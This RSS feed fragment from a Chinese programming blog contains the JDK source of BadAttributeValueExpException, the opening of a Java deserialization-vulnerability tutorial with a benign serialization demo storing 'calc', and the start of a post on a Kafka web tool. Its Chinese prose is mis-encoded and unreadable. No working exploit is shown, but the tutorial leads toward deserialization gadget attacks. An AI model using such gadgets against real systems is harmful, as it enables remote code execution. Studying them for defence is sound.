&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; Object val;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     * Constructs a BadAttributeValueExpException using the specified Object to
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     * create the toString() value.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     * @param val the inappropriate value.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BadAttributeValueExpException&lt;/span&gt; (Object val) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; val &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; : val.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     * Returns the string representing the object.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;()  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BadAttributeValueException: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; val;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;(ObjectInputStream ois) &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; IOException, ClassNotFoundException {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ObjectInputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetField&lt;/span&gt; gf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ois.&lt;span style=&#34;color:#a6e22e&#34;&gt;readFields&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Object valObj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gf.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;val&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (valObj &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (valObj &lt;span style=&#34;color:#66d9ef&#34;&gt;instanceof&lt;/span&gt; String) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            val&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; valObj;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (System.&lt;span style=&#34;color:#a6e22e&#34;&gt;getSecurityManager&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; valObj &lt;span style=&#34;color:#66d9ef&#34;&gt;instanceof&lt;/span&gt; Long
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; valObj &lt;span style=&#34;color:#66d9ef&#34;&gt;instanceof&lt;/span&gt; Integer
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; valObj &lt;span style=&#34;color:#66d9ef&#34;&gt;instanceof&lt;/span&gt; Float
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; valObj &lt;span style=&#34;color:#66d9ef&#34;&gt;instanceof&lt;/span&gt; Double
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; valObj &lt;span style=&#34;color:#66d9ef&#34;&gt;instanceof&lt;/span&gt; Byte
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; valObj &lt;span style=&#34;color:#66d9ef&#34;&gt;instanceof&lt;/span&gt; Short
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; valObj &lt;span style=&#34;color:#66d9ef&#34;&gt;instanceof&lt;/span&gt; Boolean) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; valObj.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; { &lt;span style=&#34;color:#75715e&#34;&gt;// the serialized object is from a version without JDK-8019292 fix&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; System.&lt;span style=&#34;color:#a6e22e&#34;&gt;identityHashCode&lt;/span&gt;(valObj) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; valObj.&lt;span style=&#34;color:#a6e22e&#34;&gt;getClass&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;getName&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°ä¼™ä¼´ä»¬å¯èƒ½ä¼šå¾ˆè¿·èŒ«ï¼Œè¿™è¦ä½•ä»ä¸‹æ‰‹ï¼Ÿ&lt;/p&gt;</description>
    </item>
    <item>
      <title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸€ï¼‰Serializable</title>
      <link>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</link>
      <pubDate>Thu, 14 Oct 2021 23:00:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</guid>
      <description>&lt;h2 id=&#34;å£°æ˜&#34;&gt;å£°æ˜&lt;/h2&gt;
&lt;p&gt;æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p&gt;
&lt;h2 id=&#34;åºåˆ—åŒ–çš„å®šä¹‰&#34;&gt;åºåˆ—åŒ–çš„å®šä¹‰&lt;/h2&gt;
&lt;p&gt;åºåˆ—åŒ–æ˜¯æŒ‡å°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡çŠ¶æ€è½¬æ¢æˆå¯å–ç”¨æ ¼å¼ï¼Œä»¥ç•™å¾…åç»­åœ¨ç›¸åŒæˆ–å¦ä¸€å°è®¡ç®—æœºç¯å¢ƒä¸­ï¼Œèƒ½æ¢å¤åŸå…ˆçŠ¶æ€çš„è¿‡ç¨‹ã€‚ä¾ç…§åºåˆ—åŒ–æ ¼å¼é‡æ–°è·å–å­—èŠ‚çš„ç»“æœæ—¶ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥äº§ç”Ÿä¸åŸå§‹å¯¹è±¡ç›¸åŒè¯­ä¹‰çš„å‰¯æœ¬ã€‚&lt;/p&gt;
&lt;h2 id=&#34;java-ä¸­çš„åºåˆ—åŒ–&#34;&gt;Java ä¸­çš„åºåˆ—åŒ–&lt;/h2&gt;
&lt;p&gt;Java è‡ªèº«æä¾›äº†åºåˆ—åŒ–çš„åŠŸèƒ½ï¼Œéœ€è¦å®ç° &lt;code&gt;java.io.Serializable&lt;/code&gt; æ¥å£ï¼Œæ ‡æ˜è¯¥å¯¹è±¡æ˜¯å¯åºåˆ—åŒ–çš„ã€‚ &lt;code&gt;java.io.Serializable&lt;/code&gt; æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œä¸éœ€è¦å¯¹è±¡å®ç°æ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹ï¼Œå±•ç¤ºäº†ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.*;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.nio.charset.StandardCharsets;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.Base64;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Eval0&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Command&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;implements&lt;/span&gt; Serializable {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; String cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;getCmd&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;setCmd&lt;/span&gt;(String cmd) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cmd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; Exception {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// å®šä¹‰ä¸€ä¸ªå¯¹è±¡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Command command &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Command();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        command.&lt;span style=&#34;color:#a6e22e&#34;&gt;setCmd&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;calc&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;åºåˆ—åŒ–å‰: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; command.&lt;span style=&#34;color:#a6e22e&#34;&gt;getCmd&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// å°†ç”¨æˆ·åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ByteArrayOutputStream buffer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ByteArrayOutputStream();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; (ObjectOutputStream outputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectOutputStream(buffer)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            outputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeObject&lt;/span&gt;(command);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// å°†å­—èŠ‚æ•°ç»„è¿›è¡Œbase64ç¼–ç ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œæˆ–è€…æ˜¯æ–‡ä»¶éƒ½å¯ä»¥å‘é€åˆ°å¦ä¸€ä¸ªç³»ç»Ÿè¿›è¡Œååºåˆ—åŒ–&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Base64.&lt;span style=&#34;color:#a6e22e&#34;&gt;getEncoder&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;encodeToString&lt;/span&gt;(buffer.&lt;span style=&#34;color:#a6e22e&#34;&gt;toByteArray&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;åºåˆ—åŒ–å: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; data);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// å°†base64ç¼–ç çš„æ•°æ®å†è§£ç ä¸ºå­—èŠ‚æ•°ç»„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; bytes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Base64.&lt;span style=&#34;color:#a6e22e&#34;&gt;getDecoder&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;decode&lt;/span&gt;(data.&lt;span style=&#34;color:#a6e22e&#34;&gt;getBytes&lt;/span&gt;(StandardCharsets.&lt;span style=&#34;color:#a6e22e&#34;&gt;UTF_8&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–ä¸ºå¯¹è±¡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ByteArrayInputStream b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ByteArrayInputStream(bytes);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; (ObjectInputStream input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectInputStream(b)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; Command obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Command) input.&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ååºåˆ—åŒ–: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; obj.&lt;span style=&#34;color:#a6e22e&#34;&gt;getCmd&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿è¡Œåè¾“å‡ºï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>åˆ†äº«ä¸€æ¬¾éå¸¸å¥½ç”¨çš„kafkaå¯è§†åŒ–webç®¡ç†å·¥å…·</title>
      <link>https://www.typesafe.cn/posts/share-a-kafka-web-manager/</link>
      <pubDate>Sun, 13 Jun 2021 00:00:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/share-a-kafka-web-manager/</guid>
      <description>&lt;p&gt;ä½¿ç”¨è¿‡&lt;code&gt;kafka&lt;/code&gt;çš„å°ä¼™ä¼´åº”è¯¥éƒ½çŸ¥é“&lt;code&gt;kafka&lt;/code&gt;æœ¬èº«æ˜¯æ²¡æœ‰ç®¡ç†ç•Œé¢çš„ï¼Œæ‰€æœ‰æ“ä½œéƒ½éœ€è¦æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤æ¥å®Œæˆã€‚ä½†æœ‰äº›å‘½ä»¤åˆå¤šåˆé•¿ï¼Œå¦‚æœæ²¡æœ‰åšç¬”è®°ï¼Œåˆ«è¯´æ˜¯æ–°æ‰‹ï¼Œå°±è¿è€æ‰‹ä¹Ÿä¸ä¸€å®šèƒ½è®°å¾—ä½ï¼Œæ¯æ¬¡æƒ³è¦ä½¿ç”¨çš„æ—¶å€™éƒ½è¦ä¸Šç½‘æœç´¢ä¸€ä¸‹ã€‚æœ‰äº›å´‡å°šgeekç²¾ç¥çš„äººæˆ–è®¸è§‰å¾—å‘½ä»¤è¡Œæ‰æ˜¯çœŸçˆ±ï¼Œä½†ä½¿ç”¨ä¸€æ¬¾å¥½ç”¨çš„å¯è§†åŒ–ç®¡ç†å·¥å…·çœŸçš„å¯ä»¥æå¤§çš„æå‡æ•ˆç‡ã€‚&lt;/p&gt;
&lt;p&gt;ä»Šå¤©ç»™å¤§å®¶ä»‹ç»çš„è¿™æ¬¾å·¥å…·å«åš&lt;code&gt;kafka-map&lt;/code&gt;ï¼Œæ˜¯æˆ‘é’ˆå¯¹æ—¥å¸¸å·¥ä½œä¸­é«˜é¢‘ä½¿ç”¨çš„åœºæ™¯å¼€å‘çš„ï¼Œä½¿ç”¨äº†è¿™æ¬¾å·¥å…·ä¹‹åå°±ä¸å¿…è´¹å¿ƒè´¹åŠ›çš„å»æŸ¥èµ„æ–™æŸä¸ªå‘½ä»¤è¦æ€ä¹ˆå†™ï¼Œå°±åƒæ˜¯ï¼šâ€œç»™ç¼–ç¨‹æ’ä¸Šç¿…è†€ï¼Œç»™kafkaè£…ä¸Šå¯¼èˆªâ€ã€‚&lt;/p&gt;
&lt;h2 id=&#34;kafka-map-ä»‹ç»&#34;&gt;kafka-map ä»‹ç»&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;kafka map&lt;/code&gt;æ˜¯ä½¿ç”¨&lt;code&gt;Java11&lt;/code&gt;å’Œ&lt;code&gt;React&lt;/code&gt;å¼€å‘çš„ä¸€æ¬¾&lt;code&gt;kafka&lt;/code&gt;å¯è§†åŒ–å·¥å…·ã€‚&lt;/p&gt;
&lt;p&gt;ç›®å‰æ”¯æŒçš„åŠŸèƒ½æœ‰ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¤šé›†ç¾¤ç®¡ç†&lt;/li&gt;
&lt;li&gt;é›†ç¾¤çŠ¶æ€ç›‘æ§ï¼ˆåˆ†åŒºæ•°é‡ã€å‰¯æœ¬æ•°é‡ã€å­˜å‚¨å¤§å°ã€offsetï¼‰&lt;/li&gt;
